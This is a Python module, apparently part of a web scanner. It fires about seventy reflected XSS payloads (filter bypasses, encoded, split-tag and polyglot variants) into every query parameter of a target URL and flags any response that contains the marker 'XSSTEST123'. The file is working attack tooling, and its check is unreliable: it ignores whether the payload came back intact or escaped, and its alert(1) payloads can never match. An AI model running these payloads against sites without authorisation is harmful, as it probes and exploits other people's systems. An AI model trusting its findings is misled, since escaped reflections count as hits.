import requests
from urllib.parse import urlparse, parse_qs, urlencode
from colorama import Fore, Style 

# --- Expanded XSS Payloads ---
XSS_PAYLOADS = [
    # Basic Script Tags (most common, often blocked)
    "<script>alert('XSSTEST123')</script>",
    "<SCRIPT>alert('XSSTEST123')</SCRIPT>", # Uppercase for case insensitivity
    "\"><script>alert('XSSTEST123')</script>", # Break out of attribute, then script
    "';alert('XSSTEST123');//", # Break out of JavaScript string
    "'-alert('XSSTEST123')-'", # Break out of a calculation context

    # Image Tags (event handler based)
    "'><img src=x onerror=alert('XSSTEST123')>",
    "<img src=x onerror=alert('XSSTEST123')>",
    "<img src=x onmouseover=alert('XSSTEST123')>",
    "<img src='#' onerror=alert('XSSTEST123')>",
    "<img src=\"x\" onerror=\"alert('XSSTEST123')\">",

    # SVG Tags (event handler based)
    "<svg/onload=alert('XSSTEST123')>",
    "<svg onload=alert('XSSTEST123')>",
    "<svg onload='alert(\"XSSTEST123\")'>",
    "<svg><script>alert('XSSTEST123')</svg>", # Closing SVG tag with script inside

    # Body Tag (event handler based)
    "<body onload=alert('XSSTEST123')>",
    "<body onpageshow=alert('XSSTEST123')>",

    # Input Tag (event handler based)
    "<input type=image src=x onerror=alert('XSSTEST123')>",
    "<input autofocus onfocus=alert('XSSTEST123')>", # Requires user interaction (focus)

    # Video/Audio/Track Tags (event handler based)
    "<video><source onerror=alert('XSSTEST123')>",
    "<audio src=x onerror=alert('XSSTEST123')>",
    "<track kind=chapters src=x onerror=alert('XSSTEST123')>",

    # iframe Tag (various attributes)
    "<iframe src=\"javascript:alert('XSSTEST123')\"></iframe>",
    "<iframe srcdoc=\"<script>alert('XSSTEST123')</script>\"></iframe>", # HTML5 srcdoc
    "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTVEVTVDEyMycpPC9zY3JpcHQ+</iframe>", # Base64 encoded script

    # Link Tag (CSS based, less common for direct alert but useful)
    # This payload is tricky for direct alert and more for style injection, but included for completeness.
    "<link rel=stylesheet href=data:text/css;base64,PGJvZHk%2Be2JhY2tncm91bmQ6dXJsKCJodHRwOi8veC54Lnhjb20vbnoiKSB9PC9ib2R5Pg== onload=alert('XSSTEST123')>",

    # Anchor Tag (javascript: pseudo-protocol)
    "<a href=\"javascript:alert('XSSTEST123')\">Click Me</a>",
    "<a onmouseover=\"alert('XSSTEST123')\">Hover Me</a>",

    # Div Tag (style attribute with URL or expression)
    "<div style=\"background-image: url(javascript:alert('XSSTEST123'))\"></div>", # Older browsers, less reliable
    "<div style=\"x:expression(alert('XSSTEST123'))\"></div>", # IE specific, very old

    # Meta Tag (refresh/redirect)
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSSTEST123')\">",

    # Event Handlers in various tags
    "<details open ontoggle=alert('XSSTEST123')>",
    "<form action=\"javascript:alert('XSSTEST123')\"><input type=submit value=XSS>",
    "<isindex action=javascript:alert('XSSTEST123') type=image>", # Obsolete, but can sometimes bypass

    # Obfuscation and Bypass Techniques
    # No closing script tag (for cases where the application adds it later or a filter removes it)
    "<script>alert('XSSTEST123')",
    "<img src=x onerror=alert('XSSTEST123')",

    # Encoded characters (HTML entities)
    "&lt;script&gt;alert('XSSTEST123')&lt;/script&gt;", # If input is HTML-decoded before rendering
    "&#x3C;script&#x3E;alert('XSSTEST123')&#x3C;/script&#x3E;", # Hexadecimal HTML entity
    "&#60;script&#62;alert('XSSTEST123')&#60;/script&#62;", # Decimal HTML entity

    # Null bytes (might bypass some filters)
    "<script>alert('XSSTEST123')%00</script>", # URL-encoded null byte

    # Line feeds/carriage returns (might break regex filters)
    "<script>\nalert('XSSTEST123')\n</script>",
    "<img\nsrc=x\nonerror=alert('XSSTEST123')>",

    # Fuzzing spaces (various types of whitespace)
    "<script >alert('XSSTEST123')</script>",
    "<script%09>alert('XSSTEST123')</script>", # Tab
    "<script%0a>alert('XSSTEST123')</script>", # Newline

    # Splitting tags/attributes
    "<scr<script>ipt>alert('XSSTEST123')</scr</script>ipt>", # If filters remove inner script
    "<IMG SRC=JaVaScRiPt:alert('XSSTEST123')>", # Mixed case

    # Without quotes around attributes
    "<img src=x onerror=alert(1)>", 
    "<body onload=alert(1)>", 

    # Javascript context bypasses
    # If injected into a JavaScript string: var x = "INJECTION_HERE";
    "'-alert('XSSTEST123')-'",
    "';alert('XSSTEST123')//",
    "\\';alert('XSSTEST123')//", # Escaped quote
    "`-alert('XSSTEST123')-`", # Backticks for template literals

    # Using different event handlers (less common, might bypass specific blacklists)
    "<body onfocus=alert('XSSTEST123')>",
    "<body onresize=alert('XSSTEST123')>",
    "<body onscroll=alert('XSSTEST123')>",
    "<marquee onstart=alert('XSSTEST123')>",

    # HTML Entities within JavaScript (requires double decoding by browser)
    "<a href='&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x54;&#x45;&#x53;&#x54;&#x31;&#x32;&#x33;&#x27;&#x29;'>Click Me</a>",

    # UTF-7 Encoding (rarely useful now but historically significant)
    "+ADw-script+AD4-alert('XSSTEST123')+ADw-/script+AD4-",

    # Data URI Schemes (for images, objects, etc.)
    "<img src=\"data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=\" onload=\"alert('XSSTEST123')\">",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTVEVTVDEyMycpPC9zY3JpcHQ+\"></object>",

    # Polyglot XSS (attempts to work in multiple contexts/browsers)
    # These are often complex and designed to work in multiple scenarios.
    # The 'alert(1)' is commonly used in polyglots to keep them shorter.
    # The tool will still check for 'XSSTEST123' reflection.
    "\"`--><script>alert('XSSTEST123')</script>",
    "</script><img src=x onerror=alert('XSSTEST123')>",
    "<details open ontoggle=alert('XSSTEST123')>",
    "<svg/onload=alert('XSSTEST123')>",
    "<body onload=alert('XSSTEST123')>",
]

def is_reflected(payload, response_text):
    """
    Checks if the 'XSSTEST123' string (our unique identifier) is present in the response text.
    """
    return "XSSTEST123" in response_text

def scan(url, timeout=10):
    """
    Scans a given URL for potential XSS vulnerabilities by injecting various payloads
    into its URL parameters. Returns structured vulnerability findings.
    """
    print(Fore.CYAN + "[*] Scanning for Cross-Site Scripting (XSS)..." + Style.RESET_ALL)

    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    findings = []

    if not query:
        print(Fore.YELLOW + "[!] No parameters found in the URL to test for XSS. Consider POST requests or other injection points." + Style.RESET_ALL)
        return findings

    for param in query:
        original_value = query[param][0]
        print(Fore.YELLOW + f"[*] Testing parameter: '{param}'" + Style.RESET_ALL)

        for payload in XSS_PAYLOADS:
            test_query = query.copy()
            test_query[param] = payload
            test_url = parsed._replace(query=urlencode(test_query, doseq=True)).geturl()

            try:
                response = requests.get(test_url, timeout=timeout)

                if is_reflected(payload, response.text):
                    print(Fore.RED + f"[!!!] Potential XSS vulnerability found in parameter '{param}'!" + Style.RESET_ALL)
                    print(Fore.RED + f"      Payload: {payload}" + Style.RESET_ALL)
                    print(Fore.RED + f"      Reflected URL: {test_url}" + Style.RESET_ALL)

                    findings.append({
                        "parameter": param,
                        "type": "Reflected XSS",
                        "payload": payload,
                        "url": test_url
                    })

                    break  # Stop after first confirmed reflection per param

            except requests.exceptions.Timeout:
                print(Fore.YELLOW + f"  [!] Request timed out for payload: {payload[:50]}..." + Style.RESET_ALL)
            except requests.exceptions.ConnectionError:
                print(Fore.RED + f"  [!] Connection error while testing {test_url}. Host might be down or blocked." + Style.RESET_ALL)
                break
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"  [!] An unexpected error occurred: {e}" + Style.RESET_ALL)

    return findings
